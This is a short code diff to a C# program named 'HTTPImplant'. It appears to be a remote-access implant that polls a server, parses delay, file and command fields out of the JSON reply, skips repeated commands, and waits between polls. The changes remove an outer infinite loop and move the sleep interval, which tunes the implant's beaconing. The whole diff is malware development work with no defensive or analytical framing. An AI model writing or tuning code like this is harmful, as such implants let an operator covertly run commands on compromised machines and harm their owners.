@@ -20,10 +20,7 @@ namespace HTTPImplant
 
         public static void Main(string[] args)
         {
-            while (true)
-            {
-                DoAsync().GetAwaiter().GetResult();
-            }
+            DoAsync().GetAwaiter().GetResult();
         }
         public static async Task DoAsync()
         {
@@ -46,6 +43,8 @@ namespace HTTPImplant
                         command.Delay = jsonResponse.Split(new string[] { "\"delay\":\"", "\",\"File" }, StringSplitOptions.None)[1];
                         command.File = jsonResponse.Split(new string[] { "\"File\":\"", "\",\"Command" }, StringSplitOptions.None)[1];
                         command.command = jsonResponse.Split(new string[] { "\"Command\":\"", "\"}" }, StringSplitOptions.None)[1];
+
+                        await Task.Delay(5000);
 
                         if (command.command == lastCommandExecuted)
                             continue;
@@ -88,8 +87,6 @@ namespace HTTPImplant
                     {
                         // Handle error scenario
                     }
-
-                    await Task.Delay(7000);
                 }
             }
         }
